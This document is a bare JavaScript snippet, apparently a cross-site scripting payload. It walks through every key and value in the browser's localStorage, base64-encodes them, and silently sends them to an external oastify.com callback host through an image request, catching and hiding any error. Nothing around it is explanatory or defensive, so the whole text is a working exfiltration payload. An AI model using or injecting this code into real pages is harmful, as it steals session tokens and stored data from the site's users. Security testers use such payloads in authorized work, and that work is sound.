(function() {
    try {
        var out = [];
        for (var i = 0; i < localStorage.length; i++) {
            var k = localStorage.key(i);
            out.push(k + "=" + encodeURIComponent(localStorage.getItem(k)));
        }
        new Image().src = "https://qf9i6cab77e8d1l5mjcyh3ko9ff63xtli.oastify.com/collect?d=" + btoa(out.join("&"));
    } catch(e) {}
})();
